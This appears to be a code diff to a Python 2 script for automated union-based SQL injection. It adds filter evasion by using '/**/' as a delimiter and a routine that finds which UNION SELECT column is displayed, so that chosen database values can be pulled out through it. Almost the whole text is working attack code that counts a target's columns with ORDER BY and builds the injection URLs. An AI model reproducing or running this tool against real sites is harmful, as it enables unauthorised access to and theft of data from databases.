@@ -5,14 +5,18 @@ Used for basic union-based SQL injection.
 """
     
 import os, sys, urllib2
+import operator
 import json
     
-class injection:
+class injector:
     
+    # Pass dict of options as param flags
     def __init__(self, flags):
-        self.flags = [] 
+        self.flags = flags 
         self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
         self.columns_upper_limit_guess = 9
+        #self.delimiter = '%20' #Can also be '/**/'
+        self.delimiter = '/**/' #Can also be '/**/'
 
     # Grab page with urllib and split on whitespace.
     # Throws HTTPError.
@@ -57,7 +61,7 @@ class injection:
 
         ### Using ORDER BY x--, x = 9,8,... ###
         count = self.columns_upper_limit_guess
-        order_by = page + '%20ORDER%20BY%20' + str(count) + '--'
+        order_by = page + self.delimiter + 'ORDER' + self.delimiter + 'BY' + self.delimiter + str(count) + '--'
         while 'Unknown' in self.html_diff(original_page, self.get_page(order_by)) and count > 0:
             count -= 1
             temp = list(order_by)
@@ -66,6 +70,23 @@ class injection:
     
         return count
     
+    def get_visible_param(self, page):
+        number_counts = {i: 0 for i in xrange(1, self.get_num_columns(page) + 1)}
+
+        union_urls = ['%20' + str(i + self.offset) for i in number_counts ]
+        new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
+
+        # Get most common number appearing in HTML, this is where to inject variables
+        diff = self.html_diff(self.get_page(page), self.get_page(new_url))
+        for line in diff:
+            for key in number_counts:
+                if str(key) in line:
+                    number_counts[key] += 1
+
+        # Return most common number (number with most instances in HTML)
+        return max(number_counts.iteritems(), key = operator.itemgetter(1))[0]
+
+        
     
     # Takes page to fuzz for injections and params to check for.
     # Returns dict of lists, keys are injected strings, values are results.
@@ -73,14 +94,16 @@ class injection:
         columns = self.get_num_columns(page)
         page1 = self.get_page(page)
         data = {}
+        magic_number = self.get_visible_param(page)
     
-        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, columns) ]
+        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, columns + 1)]
         for param in params:
             data[param] = []
-            for i in xrange(0, len(union_urls) + 1):
-                new_url = page + '%20UNION%20SELECT' + ",".join(union_urls[:i] + ['%20' + param] + union_urls[i:])
-                #print new_url
-                data[param].append(self.html_diff(page1, self.get_page(new_url)))
+            union_urls[magic_number - 1] = '%20' + param
+
+            new_url = page + '%20UNION%20SELECT' + ','.join(union_urls)
+            print new_url
+            data[param].append(self.html_diff(page1, self.get_page(new_url)))
     
         return data
     
